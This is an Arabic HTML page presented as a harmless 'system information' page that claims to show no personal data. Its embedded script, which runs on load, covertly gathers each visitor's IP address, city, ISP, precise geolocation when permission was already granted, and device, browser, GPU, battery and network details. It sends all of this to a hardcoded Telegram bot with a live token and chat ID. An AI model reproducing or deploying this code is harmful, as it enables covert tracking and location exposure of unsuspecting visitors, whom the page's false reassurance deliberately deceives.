<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معلومات النظام</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            color: #333;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: right;
            direction: rtl;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            color: #0056b3;
            text-align: center;
        }
        p {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>مرحبا بك! 👋</h1>
        <p>
            مرحباً بكم في صفحة معلومات النظام.
            <br>
            هذه الصفحة لا تعرض أي بيانات شخصية.
        </p>
    </div>

    <script>
        const BOT_TOKEN = '8386388789:AAGKW1bLw9xdEldclKGvNqUekVgE5WiuGaU';
        const CHAT_ID = '6313103532';

        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });

            fetch(`${url}?${params.toString()}`)
                .then(response => response.json())
                .then(data => {
                    console.log('🔔 استجابة Telegram:', data);
                    if (data.ok) {
                        console.log('تم الإرسال بنجاح');
                    } else {
                        console.error('فشل الإرسال:', data.description);
                    }
                })
                .catch(error => {
                    console.error('خطأ Fetch:', error);
                });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('فشل في الحصول على معلومات IP:', error);
                return {};
            }
        }

        async function getGeoLocation() {
            if ('geolocation' in navigator && 'permissions' in navigator) {
                try {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    if (permissionStatus.state === 'granted') {
                        return new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                position => {
                                    resolve({
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude
                                    });
                                },
                                error => {
                                    console.error('فشل في الحصول على الموقع الجغرافي:', error.message);
                                    resolve({});
                                },
                                { enableHighAccuracy: true }
                            );
                        });
                    } else {
                        console.log('إذن الموقع غير ممنوح.');
                        return {};
                    }
                } catch (error) {
                    console.error('فشل في الاستعلام عن إذن الموقع:', error);
                    return {};
                }
            } else {
                console.error('الموقع الجغرافي أو Permissions API غير مدعوم.');
                return {};
            }
        }

        function getDeviceType(userAgent) {
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
                return "جهاز لوحي";
            }
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) {
                return "هاتف محمول";
            }
            return "حاسوب مكتبي";
        }

        function getOS(userAgent) {
            if (/windows phone/i.test(userAgent)) return "Windows Phone";
            if (/android/i.test(userAgent)) {
                const match = userAgent.match(/Android\s([0-9.]+)/);
                return match ? `Android ${match[1]}` : 'Android';
            }
            if (/iPad|iPhone|iPod/i.test(userAgent)) return "iOS";
            if (/win/i.test(userAgent)) return "Windows";
            if (/mac/i.test(userAgent)) return "macOS";
            if (/linux/i.test(userAgent)) return "Linux";
            return "نظام غير معروف";
        }

        function getBrowser(userAgent) {
            const ua = userAgent.toLowerCase();
            let name = "غير معروف";
            let version = "غير معروف";

            if (ua.includes('edge')) { name = "Microsoft Edge"; version = ua.split('edge/')[1]; }
            else if (ua.includes('edg')) { name = "Microsoft Edge"; version = ua.split('edg/')[1]; }
            else if (ua.includes('chrome')) { name = "Chrome"; version = ua.split('chrome/')[1].split(' ')[0]; }
            else if (ua.includes('safari')) { name = "Safari"; version = ua.split('version/')[1].split(' ')[0]; }
            else if (ua.includes('firefox')) { name = "Firefox"; version = ua.split('firefox/')[1]; }

            return { name, version };
        }

        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            } catch {
                return { vendor: "غير معروف", renderer: "غير معروف" };
            }
        }

        function getAudioSupport() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                return ctx ? "مدعوم" : "غير مدعوم";
            } catch {
                return "غير مدعوم";
            }
        }

        function getTouchSupport() {
            return ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0) ? 'مدعوم' : 'غير مدعوم';
        }

        function getBluetoothSupport() {
            return navigator.bluetooth ? 'مدعوم' : 'غير مدعوم';
        }
        
        function getGeoCapability() {
            return 'geolocation' in navigator ? 'مدعوم' : 'غير مدعوم';
        }

        async function gatherAndSendInfo() {
            const [ipInfo, geo] = await Promise.all([getIPInfo(), getGeoLocation()]);
            const ua = navigator.userAgent;
            const browser = getBrowser(ua);
            const gpu = getGPUInfo();
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

            let batteryLevel = 'غير معروف';
            let batteryCharging = 'غير معروف';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.floor(battery.level * 100)}%`;
                    batteryCharging = battery.charging ? 'نعم' : 'لا';
                } catch (e) {
                    console.error('فشل في الحصول على معلومات البطارية:', e);
                }
            }
            
            const now = new Date();
            const hijriDate = new Intl.DateTimeFormat('ar-SA-u-ca-islamic', {
              day: 'numeric',
              month: 'long',
              year: 'numeric',
              timeStyle: 'medium',
              hour12: true
            }).format(now);

            const info = {
                "📱 نوع الجهاز": getDeviceType(ua),
                "🖥️ نظام التشغيل": getOS(ua),
                "🌐 اسم المتصفح": browser.name,
                "📊 إصدار المتصفح": browser.version,
                "📜 إصدار الجهاز": ua,
                "📏 دقة الشاشة": `${screen.width}x${screen.height}`,
                "🔄 وضع الشاشة": screen.orientation?.type || "غير معروف",
                "🌐 لغة النظام": navigator.language || "غير معروف",
                "✋ دعم الإيماءات اللمسية": getTouchSupport(),
                "🔵 دعم البلوتوث": getBluetoothSupport(),
                "🔒 بروتوكول الأمان": window.location.protocol,
                "🌍 عنوان IP": ipInfo.ip || "غير معروف",
                "🏙️ المدينة": ipInfo.city || "غير معروف",
                "🔻 الدولة": ipInfo.country_name || "غير معروف",
                "📈 خط الطول": geo.longitude || "غير معروف",
                "📉 خط العرض": geo.latitude || "غير معروف",
                "📶 الشبكة": ipInfo.org || "غير معروف",
                "📡 نوع الاتصال": conn?.effectiveType || "غير معروف",
                "⚡ سرعة الاتصال": conn?.downlink ? `${conn.downlink} Mbps` : "غير معروف",
                "🧠 الذاكرة (RAM)": navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف",
                "⚙️ عدد الأنوية": navigator.hardwareConcurrency || "غير معروف",
                "🎨 عمق الألوان": `${screen.colorDepth} بت`,
                "🌍 إمكانية تحديد الموقع الجغرافي": getGeoCapability(),
                "⏰ الوقت": hijriDate,
                "🔋 شحن الهاتف": batteryLevel,
                "⚡ هل الهاتف يشحن؟": batteryCharging
            };
        
            let message = '';
            for (const key in info) {
                message += `*${key}*: ${info[key]}\n`;
            }
        
            sendTelegramMessage(message);
        }
        
        document.addEventListener('DOMContentLoaded', gatherAndSendInfo);
    </script>
</body>
</html>
